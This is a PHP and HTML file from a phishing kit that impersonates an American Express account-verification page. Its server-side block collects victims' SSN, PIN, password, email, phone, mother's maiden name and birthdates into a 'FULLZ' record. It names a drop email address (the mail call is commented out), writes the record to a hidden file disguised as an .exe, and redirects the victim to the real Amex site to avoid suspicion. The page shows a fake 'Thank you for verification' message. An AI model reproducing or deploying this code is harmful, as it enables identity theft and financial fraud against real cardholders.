<?php

if(isset($_POST['action']))
    if($_POST['action'] == 'submit'){



$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];





$message .= "
===========|AMEX PAGE3|========
======================+ 2ostor ya rab :\ +====================
phone    : ".$phone."
ssn    : ".$ssn."
mothername    : ".$mothername."
birthdate    : ".$birth."
mother birthdate    : ".$mbirth."
pin    : ".$pin."
email    : ".$email."
pass    : ".$pwd."
======================    PC-INFO ====================
Date / time       : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========NUN|===================

||=========||NUN |=====================||\n";
$send="olafberra99@gmail.com";
$subject = "Amex FULLZ | $ip";
//mail($send,$subject,$message);
$f = fopen("../.ReScuaEsxvc05_SS153.exe", "a");
fwrite($f, $message);

die("<script>location.href = 'https://global.americanexpress.com'</script>");

}

?>
<!DOCTYPE html>
<html lang="en">
<head>

<script>
function validateForm() {

    var dob = document.forms["payment-form2"]["birthday"].value;
    var pattern =/^([0-9]{2})\/([0-9]{2})\/([0-9]{4})$/;
    if (dob == null || dob == "" || !pattern.test(dob)) {
	alert("Date of Birth is invalid");
	return false;
    }

    var mother = document.forms["payment-form2"]["mother_card_expired_yyyy"].value;
    if (mother > 1985 || mother < 1800 )
    {
    alert("Mother's Date Of Birth is invalid");
	return false;

    }


    
}


</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>American Express</title>
    <link rel="icon" href="img/favicon.ico" type="image/gif" sizes="16x16">
    <!--Css Importing-->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-social/5.1.1/bootstrap-social.min.css"/>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/global.css">


    <script language="JavaScript" src="js/ck.js" type="text/javascript"></script>
<script src="js/angular.min.js"></script>
<script src="js/jquery.min.js"></script>
<script src="js/jquery.validate.min.js"></script>
<script src="js/jquery.mask.js"></script>
    <style>



.blue-button {

    margin-top: 15px;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    -webkit-appearance: none;
    text-indent: 0;
    display: inline-block;
    color: #fff;
    font-family: Arial;
    font-size: 13px;
    font-style: normal;
    height: 40px;
    line-height: 35px;
    width: 124px;
    text-decoration: none;
    text-align: center;
    line-height: 40px;
    background-color: #ad1d23;
    background: #ad1d23;
}




.agree, .close, .continue {
    background-color: #ad1d23;
    background: #ad1d23;
    border: 0;
}

.agree:not(.nohover):hover, .close:not(.nohover):hover, .continue:not(.nohover):hover {
    background: -moz-linear-gradient(center top,#3064a8 5%,#6695cc 100%);
    background-color: #3064a8;
    cursor: pointer;
}
.continue:not(.nohover):hover, .close:not(.nohover):hover, .agree:not(.nohover):hover {
    background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #3064a8), color-stop(1, #6695cc) );
    background: -moz-linear-gradient( center top, #3064a8 5%, #6695cc 100% );
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#3064a8', endColorstr='#6695cc');
    background-color: #3064a8;
    cursor: pointer;
}

.caddoooroo  {margin-top:10px;height:45px;width: 420px;padding-left: 20px;margin-right: 18px;font-weight:400;text-decoration:none;font-size:13px;color:#44464a;border-radius:2px;border:1px solid #cfd1d7}



}




</style>





<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>



<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
        </style>



<meta http-equiv="refresh" content="5;url=https://global.americanexpress.com" />
</head>
<style>
    input:focus {
        border-color: #d9d9d9;
    }
    input:valid {
        /*border-color: #42d142;*/
    }


</style>
<body>
<header>
    <div class="container">
        <nav class="navbar navbar-default " role="navigation" data-scroll-header>
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-menu">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand logo_desktop"  href="#"><img src="img/dls-logo-bluebox-solid.svg" alt=""></a>
                <a class="navbar-brand logo_mobile"  href="#"><img src="img/dls-logo-stack.svg" alt=""></a>
                <a href="#" class="login m_login">Log in</a>
            </div>
            <div class="collapse navbar-collapse" id="main-menu">
                <ul class="nav navbar-nav navbar-left">
                    <li><a data-scroll href="#">My Account</a></li>
                    <li><a data-scroll href="#">Cards</a></li>
                    <li><a data-scroll href="#">Travel</a></li>
                    <li><a data-scroll href="#">Rewards</a></li>
                    <li><a data-scroll href="#">Business</a></li>
                </ul>
                <ul class="co_login nav navbar-nav navbar-right">
                    <li><span class="glyphicon glyphicon-search" aria-hidden="true"></span></li>
                    <li><a href="#" class="help">help</a></li>
                    <li><a href="#" class="login">Log in</a></li>
                </ul>
            </div>
        </nav>
    </div>
</header>
<section class="section">
    <div class="container" style="background: #fff; padding: 23px;">
        <div class="row flex-justify-center" style="position: relative;">
     



<!-- mail part -->



<div>


<h4 style="text-align: center">
          <span style="color: #006fcf; " class="glyphicon glyphicon-ok-circle"></span>
Thank you for verification, you will be forwarded to the home page to Re-Login and review your transactions.
</h4>
</div>






<!-- end mail part -->












                </div>
    </div>
</section>
<footer class="container">
    <div class="footer_1 row">
        <div class="col-md-3">
            <p>About</p>
            <ul>
                <li><a href="#">About American Express</a></li>
                <li><a href="#">Investor Relations</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Site Map</a></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>PRODUCTS & SERVICES</p>
            <ul>
                <li><a href="#">Credit Cards</a></li>
                <li><a href="#">Small Business Credit Cards</a></li>
                <li><a href="#">Corporate Cards</a></li>
                <li><a href="#">Prepaid Cards</a></li>
                <li><a href="#">Savings Accounts & CDs</a></li>
                <li><a href="#">Gift Cards</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>LINKS YOU MAY LIKE</p>
            <ul>
                <li><a href="#">Membership Rewards</a></li>
                <li><a href="#">Free Credit Score & Report</a></li>
                <li><a href="#">CreditSecure</a></li>
                <li><a href="#">Bluebird</a></li>
                <li><a href="#">Accept Amex Cards</a></li>
                <li><a href="#">Refer A Friend</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>ADDITIONAL INFORMATION</p>
            <ul>
                <li><a href="#">Card Agreements</a></li>
                <li><a href="#">Financial Education</a></li>
                <li><a href="#">Servicemember Benefits</a></li>
                <li><a href="#">Supplier Management</a></li>
            </ul>
        </div>
    </div>
    <hr>
    <div class="footer_2">
        <div class="foo_logo">
            <div><img src="img/dls-logo-line.svg"></div>
            <div><p><img src="img/dls-flag-us.svg" style="max-width: 21px;"> United States <a href="#">Change
                Coudiv>
</footer>
</body>
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script src="js/bootstrap-formhelpers-phone.js"></script>
<script>
    $('.question').hide();
    $('#question1').show();
    $('#questions').change(function(){
        $('.question').hide();
        $('#question' + $(this).val()).show();
    });
    // mother_card_expired_mm
    $('#mother_card_expired_mm').on('change', function(){
        let str = $(this).val();
        if(str> 12 || str< 1){
            if(str>12){
                $(this).val("12");
            }
            else{
                $(this).val("1");
            }
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }
    });
    
    $('#card_expired_mm').on('change', function(){
        let str = $(this).val();
        if(str> 12 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }
    });
    $("#card_expired_mm").focusout(function(){
        let str = $(this).val();
        if(str> 12 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });
    //mother_card_expired_dd
    $('#mother_card_expired_dd').on('change', function(){
        let str = $(this).val();
        if(str> 31 || str< 1){
            if(str >31){
                $(this).val("31");
            }
            else {
                $(this).val("1");
            }
            $(this).addClass("warning_controller");
        }
    });
    
    $('#card_expired_dd').on('change', function(){
        let str = $(this).val();
        if(str> 31 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }
    });
    $("#card_expired_dd").focusout(function(){
        let str = $(this).val();
        if(str> 31 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });
    //mother_card_expired_yyyy
    $('#mother_card_expired_yyyy').on('change', function(){
        let str = $(this).val();
        if(str>= 1980 || str< 1800){
            if(str >= 1980){
                //$(this).val("1980");
                $(this).addClass("warning_controller");
            }
            else {
                //$(this).val("1800");
                $(this).addClass("warning_controller");
            }
            // $(this).val("2019");
            //$(this).addClass("warning_controller");
        }
    });
    
    $('#card_expired_yyyy').on('change', function(){
        let str = $(this).val();
        if(str>= 2002 || str< 1900){
            // $(this).val("2019");
            $(this).addClass("warning_controller");
        }
    });
    $("#card_expired_yyyy").focusout(function(){
        let str = $(this).val();
        if(str>= 2027 || str< 2019){
            // $(this).val("2019");
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });

    $("#continuebtn").on('click' ,function () {
        // if($('#card_number').val().length === 17 && $('#card_id').val().length ===4 &&
        //     $('#card_security').val().length === 3
        // ){
        //     $("#payment-form").submit();
        // }
    });

    $('input:empty, textarea:empty').addClass('empty');
    $('input').keyup(function () {
        if ($(this).val().trim() !== '') {
            $(this).removeClass('warning_controller');
        } else {
            $(this).addClass('warning_controller');
        }
    });
</script>
</html>
